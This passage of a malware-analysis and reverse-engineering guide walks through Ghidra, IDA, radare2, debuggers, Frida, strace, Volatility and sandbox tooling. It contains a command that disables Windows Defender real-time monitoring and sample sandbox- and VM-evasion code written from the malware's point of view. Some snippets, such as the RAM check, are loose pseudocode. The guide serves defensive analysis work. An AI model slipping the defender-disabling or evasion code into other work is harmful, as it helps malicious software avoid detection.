Set-MpPreference -DisableRealtimeMonitoring $true

# Install analysis tools
choco install processhacker
choco install procmon
choco install regshot
choco install wireshark
choco install python

# Network isolation (Host-only or NAT with INetSim)
```

**Docker Malware Analysis Container**

```bash
# Isolated analysis environment
docker run -it --rm --network none remnux/remnux-distro bash

# With network access (controlled)
docker run -it --rm remnux/remnux-distro bash
```

---

## Decompilation Techniques

Decompilation converts compiled binaries back into higher-level representations (assembly, pseudocode, or source-like code) for analysis. Different architectures and languages require specific tools.

### Disassemblers

**Ghidra - NSA Reverse Engineering Framework**

```bash
# Installation
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_X.X.X/ghidra_X.X.X_PUBLIC_XXXXXXXX.zip
unzip ghidra_*.zip
cd ghidra_*/
./ghidraRun

# Headless analysis (command-line)
./analyzeHeadless /path/to/project ProjectName -import suspicious.exe -postScript DecompileAll.java

# Scripting with Ghidra
# Language: Java or Python (Jython)
# Script location: ghidra_scripts/

# Common analysis workflow:
# 1. File â†’ Import File â†’ suspicious.exe
# 2. Analysis â†’ Auto Analyze (select all analyzers)
# 3. Window â†’ Decompiler
# 4. Search â†’ For Strings
# 5. Search â†’ For Functions
# 6. Export â†’ C/C++ (pseudocode)
```

**IDA Pro/IDA Free - Industry Standard Disassembler**

```bash
# IDA Free (limited features)
# Download from: https://hex-rays.com/ida-free/

# Command-line analysis (IDA Pro)
idaq64 -A -Ssuspicious.idc suspicious.exe

# IDAPython scripting
import idaapi
import idc

# Get function names
for func_ea in Functions():
    print(f"{hex(func_ea)}: {GetFunctionName(func_ea)}")

# Find cross-references
xrefs = XrefsTo(function_address)
for xref in xrefs:
    print(f"Called from: {hex(xref.frm)}")

# Common IDA operations:
# - View â†’ Open Subviews â†’ Strings (Shift+F12)
# - View â†’ Open Subviews â†’ Functions (Shift+F3)
# - Jump â†’ Jump to address (G)
# - Create function (P)
# - Rename (N)
# - Add comment (; for regular, : for repeatable)
```

**Radare2 - Open Source Reverse Engineering Framework**

```bash
# Installation
apt-get install radare2

# Open binary
r2 suspicious.exe

# Analysis
[0x00000000]> aaa  # analyze all
[0x00000000]> afl  # list functions
[0x00000000]> axt @ function_address  # cross-references to
[0x00000000]> axf @ function_address  # cross-references from

# Disassemble function
[0x00000000]> pdf @ main  # print disassembly function

# Seek to address
[0x00000000]> s 0x401000

# Visual mode
[0x00000000]> V
[0x00000000]> VV  # graph mode

# Search for strings
[0x00000000]> iz  # strings in data sections
[0x00000000]> izz  # strings in entire binary

# Search for bytes
[0x00000000]> /x 4883ec20  # search hex pattern

# Decompile with r2dec plugin
[0x00000000]> pdd @ main

# Export to JSON
[0x00000000]> agj @ main  # function graph JSON

# Radare2 cutter GUI
cutter suspicious.exe
```

**objdump - GNU Binary Utilities**

```bash
# Disassemble all sections
objdump -D suspicious.exe

# Disassemble executable sections only
objdump -d suspicious.exe

# Intel syntax (more readable)
objdump -M intel -d suspicious.exe

# With source code interleaved (if available)
objdump -S suspicious.exe

# Show section headers
objdump -h suspicious.exe

# Show symbols
objdump -t suspicious.exe

# Specific function disassembly
objdump -d suspicious.exe | grep -A 50 "<function_name>:"
```

**Capstone - Disassembly Framework**

```python
# Python disassembly with Capstone
from capstone import *

# Read binary
with open('suspicious.exe', 'rb') as f:
    code = f.read()

# Disassemble (x86-64)
md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(code[0x1000:0x2000], 0x401000):  # offset and base address
    print(f"0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}")

# ARM disassembly
md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
for i in md.disasm(arm_code, 0x1000):
    print(f"0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}")
```

### Decompilers (High-Level Code Reconstruction)

**Ghidra Decompiler**

```
# Built into Ghidra
# Window â†’ Decompiler
# Shows C-like pseudocode from assembly

# Tips:
# - Right-click variables â†’ Retype Variable
# - Right-click functions â†’ Edit Function Signature
# - Edit â†’ Tool Options â†’ Decompiler â†’ Display
# - Ctrl+E: Export function as C
```

**Hex-Rays Decompiler (IDA Pro Plugin)**

[Inference: Commercial plugin for IDA Pro, not in IDA Free]

```
# F5 key: Decompile current function
# Right-click â†’ Convert to struct/array
# Y: Change type
# N: Rename variable
# Tab: Switch between assembly and pseudocode
```

**RetDec - Retargetable Decompiler**

```bash
# Installation
git clone https://github.com/avast/retdec
cd retdec
mkdir build && cd build
cmake .. -DCMAKE_INSTALL_PREFIX=/usr/local
make -j$(nproc)
sudo make install

# Decompile binary
retdec-decompiler suspicious.exe

# Output: suspicious.c (C pseudocode)

# Specific architecture
retdec-decompiler --arch x86 --format elf suspicious

# With debugging info
retdec-decompiler -g suspicious.exe

# Online version (limited)
# https://retdec.com/decompilation/
```

**Snowman - Native Code to C/C++ Decompiler**

```bash
# Installation (GUI)
git clone https://github.com/yegord/snowman
cd snowman
mkdir build && cd build
cmake ..
make

# Usage: GUI-based
./snowman

# Load binary â†’ Analyze â†’ View decompiled code
```

**JEB Decompiler (Commercial)**

[Unverified: Primarily for Android/DEX but supports native code]

### Language-Specific Decompilation

**Java Decompilation**

```bash
# JAD - Java Decompiler (legacy)
jad suspicious.class

# CFR - Modern Java Decompiler
java -jar cfr.jar suspicious.class --outputdir output/

# Procyon
java -jar procyon-decompiler.jar suspicious.class

# FernFlower (IntelliJ decompiler)
java -jar fernflower.jar suspicious.jar output/

# JD-GUI - Graphical decompiler
jd-gui suspicious.jar

# Decompile entire JAR
java -jar cfr.jar suspicious.jar --outputdir src/
```

**.NET Decompilation**

```bash
# ILSpy (cross-platform)
ilspy suspicious.exe

# dnSpy (Windows, more powerful)
# Download: https://github.com/dnSpy/dnSpy

# dotPeek (JetBrains, Windows)
# [Inference: GUI-based tool]

# ildasm - IL Disassembler (native .NET tool)
ildasm /out=output.il suspicious.exe

# ilasm - IL Assembler (recompile modified IL)
ilasm output.il /exe

# Decompile to C# with ILSpy CLI
ilspycmd -o output/ -p suspicious.dll
```

**Python Decompilation**

```bash
# Uncompyle6 - Python bytecode decompiler
pip install uncompyle6

# Decompile .pyc file
uncompyle6 suspicious.pyc

# Decompile to file
uncompyle6 -o suspicious.py suspicious.pyc

# Batch decompile
uncompyle6 -o output_dir/ *.pyc

# pycdc - Alternative decompiler
git clone https://github.com/zrax/pycdc
cd pycdc
cmake . && make
./pycdc suspicious.pyc
```

**PowerShell Decompilation**

```powershell
# Compiled PS1 to EXE (PS2EXE reversal)
# Extract embedded script
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("suspicious.exe"))
$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.Location -eq ""}
$assembly.GetTypes() | ForEach-Object {$_.GetMethod("Main")}

# Or use tools like PS1ToExe extractor
# [Unverified: Third-party extraction tools]

# Deobfuscate PowerShell
# https://github.com/R3MRUM/PSDecode
Import-Module PSDecode.psm1
PSDecode -dump obfuscated.ps1
```

**Android APK Decompilation**

```bash
# apktool - Decompile APK resources
apktool d suspicious.apk -o output/

# dex2jar - Convert DEX to JAR
d2j-dex2jar suspicious.apk

# Then decompile JAR with JD-GUI or CFR
jd-gui suspicious-dex2jar.jar

# jadx - Direct DEX to Java
jadx suspicious.apk -d output/

# Smali/Baksmali - DEX to Smali assembly
baksmali d classes.dex -o output/
```

### Binary Patching

**Hex Editors**

```bash
# wxHexEditor
wxhexeditor suspicious.exe

# Bless Hex Editor
bless suspicious.exe

# Command-line hex editing with xxd
xxd suspicious.exe > hex_dump.txt
# Edit hex_dump.txt
xxd -r hex_dump.txt > patched.exe

# Binary patch with dd
# Patch byte at offset 0x1000 to 0x90 (NOP)
printf '\x90' | dd of=suspicious.exe bs=1 seek=4096 count=1 conv=notrunc
```

**Radare2 Patching**

```bash
r2 -w suspicious.exe  # write mode

# Write assembly
[0x00401000]> wa jmp 0x401234  # write assembly instruction

# Write hex bytes
[0x00401000]> wx 90909090  # write 4 NOPs

# Write string
[0x00402000]> w Hello World

# Patch in visual mode
[0x00401000]> V
# A: assemble
# i: insert hex

# Save changes
[0x00401000]> wc  # write cache to disk
```

**IDA Pro Patching**

```
# Edit â†’ Patch Program â†’ Assemble
# Change instruction
# Edit â†’ Patch Program â†’ Apply patches to input file
```

---

## Debugger Usage

Debuggers allow runtime inspection, breakpoint setting, memory examination, and single-step execution for dynamic analysis and vulnerability discovery.

### GDB - GNU Debugger

**Basic GDB Usage**

```bash
# Start debugging
gdb ./program

# With arguments
gdb --args ./program arg1 arg2

# Attach to running process
gdb -p <PID>

# Run program
(gdb) run
(gdb) r arg1 arg2

# Set breakpoints
(gdb) break main
(gdb) b *0x401000  # at address
(gdb) b function_name
(gdb) b file.c:123  # line number

# List breakpoints
(gdb) info breakpoints
(gdb) i b

# Delete breakpoint
(gdb) delete 1  # by number
(gdb) clear function_name

# Continue execution
(gdb) continue
(gdb) c

# Step execution
(gdb) step  # step into
(gdb) s
(gdb) next  # step over
(gdb) n
(gdb) stepi  # single instruction
(gdb) si
(gdb) nexti
(gdb) ni

# Examine registers
(gdb) info registers
(gdb) i r
(gdb) p $rax  # print specific register
(gdb) p/x $rip  # print in hex

# Examine memory
(gdb) x/20x $rsp  # 20 hex words at stack pointer
(gdb) x/s 0x401000  # string at address
(gdb) x/10i $rip  # 10 instructions at instruction pointer
(gdb) x/20gx $rsp  # 20 giant (8-byte) values in hex

# Memory examination formats:
# x - hex, d - decimal, u - unsigned, o - octal
# t - binary, a - address, c - char, s - string, i - instruction
# b - byte, h - halfword, w - word, g - giant (8 bytes)

# Examine backtrace
(gdb) bt
(gdb) backtrace

# Print variables
(gdb) print variable_name
(gdb) p variable
(gdb) p/x variable  # hex format

# Set variables
(gdb) set variable var = 123
(gdb) set $rax = 0

# Disassemble
(gdb) disassemble main
(gdb) disas function_name
(gdb) disas 0x401000,0x401100  # address range
```

**GDB-PEDA - Python Exploit Development Assistance**

```bash
# Installation
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Enhanced features:
# - Color-coded assembly
# - Automatic context display (registers, stack, code)
# - Pattern generation for buffer overflow
# - ROP gadget search

# Context display (automatic)
(gdb) context

# Pattern generation
(gdb) pattern create 200
(gdb) pattern offset 0x41414641

# Search for gadgets
(gdb) ropsearch "pop rdi"

# Find JMP/CALL
(gdb) jmpcall

# Search memory
(gdb) searchmem "/bin/sh"

# Examine process mappings
(gdb) vmmap

# ELF header info
(gdb) elfheader
```

**GEF - GDB Enhanced Features**

```bash
# Installation
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or manual:
wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
echo source ~/.gdbinit-gef.py >> ~/.gdbinit

# Similar to PEDA but more modern
# Automatic context, heap commands, pattern generation

# Context (automatic on break)
gefâž¤  

# Pattern
gefâž¤  pattern create 200
gefâž¤  pattern search $rsp

# Heap analysis
gefâž¤  heap chunks
gefâž¤  heap bins

# Checksec
gefâž¤  checksec

# VMMap
gefâž¤  vmmap

# Search strings
gefâž¤  search-pattern "/bin/sh"

# ROPgadget integration
gefâž¤  ropper
```

**pwndbg - Exploit Development GDB Plugin**

```bash
# Installation
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Features similar to PEDA/GEF
# Enhanced heap visualization
# Automatic exploitation helper

pwndbg> context
pwndbg> cyclic 200
pwndbg> cyclic -l 0x61616171
pwndbg> search /bin/sh
pwndbg> vmmap
pwndbg> heap
```

### x64dbg/x32dbg - Windows Debugger

[Inference: Primarily Windows-based GUI debugger]

```
# Download: https://x64dbg.com/

# Features:
# - Graphical interface
# - Plugin ecosystem
# - Scripting support
# - Memory/register editing
# - Breakpoint management

# Common shortcuts:
# F2: Set breakpoint
# F7: Step into
# F8: Step over
# F9: Run
# Ctrl+G: Go to address
# Ctrl+F: Search
# Ctrl+B: Binary edit

# Scripting (x64dbgpy)
# Python integration for automation
```

### OllyDbg - Legacy Windows Debugger

[Inference: Older tool, still used for 32-bit analysis]

```
# Download: http://www.ollydbg.de/

# Similar to x64dbg but 32-bit focused
# Plugins: OllyDump, OllySSEH, OllyAdvanced

# Common operations:
# F2: Breakpoint
# F7: Step into
# F8: Step over
# F9: Run
# Ctrl+N: Module names
# Ctrl+G: Go to address
```

### WinDbg - Microsoft Windows Debugger

```cmd
REM Download from Microsoft Store or SDK

REM Attach to process
windbg -p <PID>

REM Open dump file
windbg -z crash.dmp

REM Basic commands
0:000> g  # go/run
0:000> p  # step over
0:000> t  # step into
0:000> bp main  # set breakpoint
0:000> bl  # list breakpoints
0:000> bc 1  # clear breakpoint

REM Registers
0:000> r  # all registers
0:000> r rax  # specific register

REM Memory
0:000> db 0x401000  # display bytes
0:000> dd 0x401000  # display dwords
0:000> dq 0x401000  # display qwords
0:000> da 0x401000  # ASCII string
0:000> du 0x401000  # Unicode string

REM Disassembly
0:000> u main
0:000> uf function_name  # unassemble function

REM Stack
0:000> k  # call stack
0:000> kv  # verbose stack

REM Symbols
0:000> x kernel32!*Create*  # search symbols

REM Modules
0:000> lm  # list modules
0:000> lmvm module_name  # verbose module info
```

### LLDB - LLVM Debugger (macOS/iOS)

```bash
# Start debugging
lldb ./program

# Run
(lldb) run
(lldb) r

# Breakpoints
(lldb) breakpoint set --name main
(lldb) b main
(lldb) breakpoint set --address 0x401000
(lldb) b 0x401000

# List breakpoints
(lldb) breakpoint list
(lldb) br l

# Continue
(lldb) continue
(lldb) c

# Step
(lldb) step
(lldb) s
(lldb) next
(lldb) n

# Registers
(lldb) register read
(lldb) reg r
(lldb) register read rax

# Memory
(lldb) memory read 0x401000
(lldb) x 0x401000
(lldb) memory read --size 4 --format x --count 10 $rsp

# Disassemble
(lldb) disassemble --name main
(lldb) di -n main
```

### Frida - Dynamic Instrumentation Toolkit

```bash
# Installation
pip install frida-tools

# List processes
frida-ps

# List running apps (mobile)
frida-ps -U

# Attach and inject script
frida -p <PID> -l script.js

# Spawn and inject
frida -f /path/to/program -l script.js

# Trace API calls
frida-trace -p <PID> -i "open*"

# Trace functions in library
frida-trace -p <PID> -I "libssl.so"
```

**Frida JavaScript Script Example:**

```javascript
// Hook function
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
    onEnter: function(args) {
        console.log("[*] strcmp called");
        console.log("[*] Arg 1: " + Memory.readUtf8String(args[0]));
        console.log("[*] Arg 2: " + Memory.readUtf8String(args[1]));
    },
    onLeave: function(retval) {
        console.log("[*] Return value: " + retval);
        // Modify return value
        retval.replace(0);
    }
});

// Hook address
Interceptor.attach(ptr("0x401234"), {
    onEnter: function(args) {
        console.log("[*] Function at 0x401234 called");
    }
});

// Read memory
var address = ptr("0x401000");
console.log(hexdump(address, {length: 64}));

// Write memory
Memory.writeUtf8String(ptr("0x402000"), "patched");

// Call function
var func = new NativeFunction(ptr("0x401000"), 'int', ['int', 'int']);
var result = func(1, 2);
```

### Debugging Techniques

**Anti-Debugging Detection**

Common anti-debugging checks:

- `IsDebuggerPresent()` (Windows)
- `ptrace(PTRACE_TRACEME)` (Linux)
- Timing checks
- Exception-based detection
- Hardware breakpoint detection
- Process/module enumeration

```bash
# Bypass IsDebuggerPresent
# Patch PEB (Process Environment Block) BeingDebugged flag
(gdb) set {char}($fs_base + 0x60 + 0x02) = 0

# Or in Frida
Interceptor.replace(Module.findExportByName("kernel32.dll", "IsDebuggerPresent"), new NativeCallback(function() {
    return 0;
}, 'int', []));
```

**Conditional Breakpoints**

```bash
# GDB: Break when condition true
(gdb) break function_name if variable == 123

# Break on write to address
(gdb) watch *0x601048

# Break on read
(gdb) rwatch *0x601048

# x64dbg: Conditional BP
# Right-click breakpoint â†’ Edit â†’ Add condition
# Example: EAX == 5
```

**Hardware Breakpoints**

```bash
# GDB hardware breakpoint
(gdb) hbreak main

# Watch memory access (limited to 4 on x86)
(gdb) watch *(int*)0x601000

# x64dbg: F2 on instruction â†’ Hardware, Execute
```

---

## Dynamic Analysis

Dynamic analysis observes program behavior during execution to identify runtime behavior, API calls, network activity, file operations, and registry modifications without requiring deep reverse engineering knowledge.

### System Call and API Monitoring

**strace - Linux System Call Tracer**

```bash
# Trace all system calls
strace ./program

# Trace specific system calls
strace -e open,read,write ./program

# Network-related calls
strace -e trace=network ./program

# File operations
strace -e trace=file ./program

# Follow child processes
strace -f ./program

# Attach to running process
strace -p <PID>

# Save to file
strace -o trace.log ./program

# Timestamps
strace -t ./program  # time of day
strace -r ./program  # relative timestamps
strace -T ./program  # time spent in each syscall

# Count system calls
strace -c ./program

# Filter by return value
strace -e trace=open -e status=successful ./program
strace -e trace=open -e status=failed ./program

# Show strings
strace -s 4096 ./program  # show up to 4096 bytes of strings

# Decode structures
strace -v ./program  # verbose
```

**ltrace - Library Call Tracer**

```bash
# Trace library calls
ltrace ./program

# Trace specific library
ltrace -l /lib/x86_64-linux-gnu/libc.so.6 ./program

# Include system calls
ltrace -S ./program

# Follow forks
ltrace -f ./program

# Attach to process
ltrace -p <PID>

# Count calls
ltrace -c ./program

# Output to file
ltrace -o trace.log ./program

# Filter specific functions
ltrace -e malloc,free ./program
ltrace -e 'malloc+free' ./program  # multiple
```

**API Monitor (Windows)**

[Inference: GUI-based Windows tool for API monitoring]

```
# Download: http://www.rohitab.com/apimonitor

# Features:
# - Monitor 15,000+ Windows APIs
# - Filter by module/category
# - Decode parameters
# - Modify return values
# - Export logs

# Common monitoring targets:
# - File I/O: CreateFile, ReadFile, WriteFile
# - Registry: RegCreateKey, RegSetValue
# - Network: WSASend, WSARecv, connect
# - Process: CreateProcess, VirtualAlloc
# - Crypto: CryptEncrypt, CryptDecrypt
```

**Process Monitor (Procmon) - Sysinternals**

```powershell
# Download from Sysinternals
# https://docs.microsoft.com/sysinternals/downloads/procmon

# Command-line usage
Procmon.exe /AcceptEula /Quiet /Minimized /BackingFile capture.pml

# Convert PML to CSV
Procmon.exe /OpenLog capture.pml /SaveAs capture.csv

# Filter examples (via GUI):
# - Process Name is suspicious.exe
# - Operation begins with "Reg"
# - Path contains "AppData"
# - Result is SUCCESS

# Common columns:
# - Time: timestamp
# - Process Name: executable
# - PID: process ID
# - Operation: what happened
# - Path: file/registry path
# - Result: success/failure
# - Detail: additional info
```

### Process Monitoring

**Process Hacker (Windows)**

```powershell
# Download: https://processhacker.sourceforge.io/

# Features:
# - Process tree visualization
# - Memory viewer/editor
# - String scanning
# - Handle enumeration
# - Thread inspection
# - Network connections
# - Service management

# Useful for:
# - Identifying injection
# - Finding hidden processes
# - Analyzing memory
# - Detecting rootkits
```

**ps and lsof (Linux)**

```bash
# List processes
ps aux

# Process tree
ps auxf
pstree -p

# Specific process
ps aux | grep suspicious

# Open files by process
lsof -p <PID>

# Network connections
lsof -i -P -n
lsof -i TCP:80  # specific port

# Files opened by program
lsof -c program_name

# Show deleted but still open files
lsof +L1

# Monitor in real-time
watch -n 1 'lsof -i -P -n'

# /proc filesystem inspection
cat /proc/<PID>/cmdline  # command line
cat /proc/<PID>/environ  # environment variables
cat /proc/<PID>/maps     # memory mappings
cat /proc/<PID>/status   # process status
ls -l /proc/<PID>/fd/    # file descriptors
ls -l /proc/<PID>/cwd    # current working directory
```

**htop - Interactive Process Viewer**

```bash
# Installation
apt-get install htop

# Run
htop

# Shortcuts:
# F2: Setup/filter
# F3: Search
# F4: Filter
# F5: Tree view
# F6: Sort by column
# F9: Kill process
# Space: Tag process
# u: Filter by user
# t: Tree view toggle
```

**volatility - Memory Forensics**

```bash
# Installation
pip install volatility3
# Or: apt-get install volatility

# Get memory dump (Linux)
dd if=/dev/mem of=memory.dump bs=1M
# Or: LiME kernel module

# Windows memory dump
# Use DumpIt, FTK Imager, or WinPmem

# Identify profile (Volatility 2)
volatility -f memory.dump imageinfo

# List processes (Volatility 3)
vol -f memory.dump windows.pslist
vol -f memory.dump linux.pslist

# Process tree
vol -f memory.dump windows.pstree

# Command line arguments
vol -f memory.dump windows.cmdline

# Network connections
vol -f memory.dump windows.netscan

# DLL list
vol -f memory.dump windows.dlllist --pid <PID>

# Dump process memory
vol -f memory.dump windows.memmap --pid <PID> --dump

# Extract process executable
vol -f memory.dump windows.dumpfiles --pid <PID>

# Scan for injected code
vol -f memory.dump windows.malfind

# Registry analysis
vol -f memory.dump windows.registry.hivelist
vol -f memory.dump windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# Strings from process
strings memory.dump | grep -i "http"
```

### Network Traffic Analysis

**Wireshark During Execution**

```bash
# Capture during execution
wireshark -i eth0 -k &
./suspicious_program

# Or with tcpdump + Wireshark
tcpdump -i eth0 -w capture.pcap &
./suspicious_program
# Kill tcpdump
wireshark capture.pcap

# Useful filters for malware:
# http.request or dns  # HTTP and DNS
# ip.addr == 192.168.1.100  # specific host
# tcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN packets (port scan)
# http.request.method == "POST"  # HTTP POST (exfiltration)
# tcp contains "password"  # search content
```

**INetSim - Internet Services Simulation**

```bash
# Installation
apt-get install inetsim

# Configuration: /etc/inetsim/inetsim.conf
# Modify:
# service_bind_address 0.0.0.0
# dns_default_ip 192.168.1.100  # your analysis VM IP

# Start INetSim
inetsim

# Simulates services:
# - HTTP/HTTPS (port 80/443)
# - DNS (port 53)
# - SMTP (port 25)
# - FTP (port 21)
# - And many more

# Configure malware VM to use INetSim as gateway/DNS
# In malware VM:
# IP: 192.168.1.101
# Gateway: 192.168.1.100 (INetSim host)
# DNS: 192.168.1.100

# Monitor logs
tail -f /var/log/inetsim/service.log
```

**Burp Suite - HTTP/HTTPS Proxy**

```bash
# Start Burp Suite
burpsuite &

# Configure browser/application to use proxy:
# 127.0.0.1:8080

# For HTTPS, install Burp CA certificate
# Proxy â†’ Options â†’ Import/Export CA certificate

# Intercept mode
# Proxy â†’ Intercept â†’ Intercept is on

# View HTTP history
# Proxy â†’ HTTP history

# Modify requests
# Right-click request â†’ Send to Repeater
# Modify and resend
```

**Fiddler - HTTP Debugging Proxy (Windows)**

```powershell
# Download: https://www.telerik.com/fiddler

# Automatically captures HTTP/HTTPS from Windows apps
# View traffic in Sessions panel
# Can decrypt HTTPS with installed certificate

# Export captured traffic
# File â†’ Export Sessions â†’ All Sessions
```

### File System Monitoring

**Regshot - Registry Comparison (Windows)**

```
# Download: https://sourceforge.net/projects/regshot/

# Usage:
# 1. Run Regshot
# 2. Click "1st shot" â†’ Shot
# 3. Execute malware
# 4. Click "2nd shot" â†’ Shot
# 5. Click "Compare"

# Shows:
# - Registry keys added/deleted/modified
# - Files added/deleted/modified
# - Useful for detecting persistence mechanisms
```

**inotifywait - Linux File System Monitoring**

```bash
# Installation
apt-get install inotify-tools

# Monitor directory
inotifywait -m /home/user/

# Monitor with events
inotifywait -m -e create,delete,modify /home/user/

# Recursive monitoring
inotifywait -m -r /home/user/

# Log to file
inotifywait -m -r -o monitor.log /home/user/

# Monitor specific files
inotifywait -m /etc/passwd /etc/shadow

# Monitor during execution
inotifywait -m -r /tmp/ &
./suspicious_program
# Kill inotifywait when done

# Script for automated monitoring
while inotifywait -r -e modify,create,delete /home/user/; do
    echo "Change detected at $(date)" >> changes.log
done
```

**auditd - Linux Audit Daemon**

```bash
# Installation
apt-get install auditd

# Watch file
auditctl -w /etc/passwd -p wa -k passwd_changes
# -w: watch path
# -p: permissions (r=read, w=write, x=execute, a=attribute)
# -k: key for filtering logs

# Watch directory
auditctl -w /tmp/ -p wa -k tmp_access

# Watch system calls
auditctl -a always,exit -F arch=b64 -S execve -k process_exec

# List rules
auditctl -l

# Search audit logs
ausearch -k passwd_changes
ausearch -ts recent  # recent events

# Generate report
aureport

# Real-time monitoring
ausearch -ts today -i | tail -f

# Remove watch
auditctl -W /etc/passwd -p wa -k passwd_changes
```

### Sandbox Evasion Detection

**Timing-Based Evasion**

```python
# Detect sleep acceleration (sandbox behavior)
import time

start = time.time()
time.sleep(10)
elapsed = time.time() - start

if elapsed < 9:  # sandbox accelerated sleep
    exit()  # evade analysis
```

**Environment Checks**

```python
# Check for sandbox indicators
import os
import platform

# Virtual machine detection
vm_indicators = [
    'vmware', 'virtualbox', 'qemu', 'xen', 'kvm',
    'virtual hd', 'vbox', 'vmtools'
]

# Check MAC address (VMware range)
# 00:05:69, 00:0C:29, 00:1C:14, 00:50:56

# Check running processes
suspicious_processes = [
    'vboxservice.exe', 'vmtoolsd.exe', 'vmsrvc.exe',
    'vmusrvc.exe', 'python.exe', 'wireshark.exe'
]

# Check username/hostname
if os.getlogin() in ['sandbox', 'malware', 'virus', 'test']:
    exit()

# Check for analysis tools
analysis_tools = [
    'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe',
    'procmon.exe', 'wireshark.exe', 'fiddler.exe'
]

# Limited RAM/disk (typical sandbox)
if total_ram < 2GB or disk_size < 60GB:
    exit()
```

**Behavioral Analysis**

```bash
# Monitor for evasion attempts
strace -e open,stat ./malware 2>&1 | grep -i "vmware\|vbox\|qemu"

# Check for sleeping
strace -e nanosleep,clock_nanosleep ./malware

# Mouse movement detection (Windows)
# Malware may check if mouse moves (human interaction)

# User interaction checks
# - Number of files in Documents
# - Recent browser history
# - Installed applications count
```

### Code Coverage Analysis

**gcov - GNU Coverage Tool**

```bash
# Compile with coverage flags
gcc -fprofile-arcs -ftest-coverage -o program program.c

# Execute program
./program

# Generate coverage report
gcov program.c

# View .gcov file
cat program.c.gcov

# Lines prefixed with:
# - Number: execution count
# - #####: never executed
# - -: non-executable line
```

**Frida Code Coverage**

```javascript
// Frida script for code coverage
var module = Process.getModuleByName("suspicious.exe");
var ranges = module.enumerateRanges('r-x');  // executable ranges

var coverage = {};

ranges.forEach(function(range) {
    Stalker.follow({
        events: {
            call: false,
            ret: false,
            exec: true,  // track execution
            block: false,
            compile: true
        },
        onReceive: function(events) {
            // Parse events for coverage
            var parsedEvents = Stalker.parse(events);
            parsedEvents.forEach(function(evt) {
                coverage[evt[1]] = true;  // mark address as executed
            });
        }
    });
});

// Export coverage data
console.log(JSON.stringify(Object.keys(coverage)));
```

**DynamoRIO - Dynamic Instrumentation**

```bash
# Installation
wget https://github.com/DynamoRIO/dynamorio/releases/download/release_X.X.X/DynamoRIO-Linux-X.X.X.tar.gz
tar -xzf DynamoRIO-Linux-*.tar.gz

# Code coverage with drcov
./drrun -t drcov -- ./program

# Output: drcov.program.*.log

# Convert to human-readable format
# Use drcov2lcov or parse manually

# Instruction tracing
./drrun -t drcov -dump_text -- ./program
```

### Automated Dynamic Analysis

**CAPE Sandbox**

```bash
# CAPE (Config And Payload Extraction)
# Fork of Cuckoo with focus on payload extraction

# Installation (complex, requires VM setup)
git clone https://github.com/kevoreilly/CAPEv2
cd CAPEv2
sudo ./installer.sh

# Submit sample
cape submit suspicious.exe

# View results
cape web
# Navigate to http://localhost:8000
```

**Detux - Linux Sandbox**

[Inference: Specialized for Linux malware]

```bash
# Submit malware to Detux
# https://detux.org/

# API submission
curl -F file=@suspicious_elf https://detux.org/api/submit
```

**Joe Sandbox Cloud**

```bash
# API submission (requires key)
curl -X POST \
  -F 'sample=@suspicious.exe' \
  -F 'apikey=YOUR_API_KEY' \
  https://jbxcloud.joesecurity.org/api/v2/submission/new
```

### Anti-Anti-Analysis Techniques

**Debugger Detection Bypass**

```bash
# Patch IsDebuggerPresent
# In GDB at IsDebuggerPresent call site
(gdb) set {unsigned char}0x401234 = 0xc3  # ret instruction

# Radare2 patch
r2 -w suspicious.exe
[0x00401234]> wa ret
[0x00401234]> wc  # commit changes

# ScyllaHide - Anti-anti-debug plugin
# For x64dbg/OllyDbg/IDA
# https://github.com/x64dbg/ScyllaHide

# Linux ptrace bypass
# LD_PRELOAD hook
cat > ptrace_hook.c << 'EOF'
long ptrace(int request, int pid, void *addr, void *data) {
    return 0;  # always succeed
}
EOF
gcc -shared -fPIC ptrace_hook.c -o ptrace_hook.so
LD_PRELOAD=./ptrace_hook.so ./suspicious_program
```

**VM Detection Bypass**

```bash
# Hide VMware artifacts
# Modify CPUID response
# Patch guest tools
# Spoof MAC address
sudo ifconfig eth0 hw ether 00:11:22:33:44:55

# QEMU with paravirtualization disabled
qemu-system-x86_64 -cpu host,-hypervisor \
    -smbios type=0,vendor=ASUS \
    -smbios type=1,manufacturer=ASUS,product=ROG \
    suspicious.qcow2

# VirtualBox hardening
VBoxManage setextradata "VM_Name" "VBoxInternal/Devices/pcbios/0/Config/DmiBIOSVendor" "Dell Inc."
VBoxManage setextradata "VM_Name" "VBoxInternal/Devices/pcbios/0/Config/DmiSystemVendor" "Dell Inc."

# al-khaser (anti-VM test tool)
# https://github.com/LordNoteworthy/al-khaser
# Test your VM against known detection techniques
```

**Sleep Acceleration Bypass**

```bash
# Hook sleep functions to actually sleep
# Frida script
Interceptor.replace(Module.findExportByName(null, "sleep"), new NativeCallback(function(seconds) {
    var start = Date.now();
    while ((Date.now() - start) / 1000 < seconds) {
        // Busy wait - can't be accelerated
    }
    return 0;
}, 'int', ['uint']));
```

### Memory Dumping During Execution

**GDB Memory Dump**

```bash
# Attach to process
gdb -p <PID>

# Find memory regions
(gdb) info proc mappings

# Dump specific region
(gdb) dump memory output.bin 0x400000 0x500000

# Dump all writable memory
(gdb) set logging on
(gdb) info proc mappings
# For each writable region:
(gdb) dump memory region1.bin START END
```

**procdump - Linux**

```bash
# Installation
git clone https://github.com/microsoft/ProcDump-for-Linux
cd ProcDump-for-Linux
make

# Dump process
./procdump -p <PID>

# Dump on CPU threshold
./procdump -C 80 -p <PID>  # when CPU > 80%

# Dump on memory threshold
./procdump -M 500 -p <PID>  # when memory > 500MB

# Multiple dumps
./procdump -n 5 -p <PID>  # 5 dumps
```

**ProcDump (Windows - Sysinternals)**

```cmd
REM Download from Sysinternals

REM Dump on crash
procdump -ma -e -w suspicious.exe

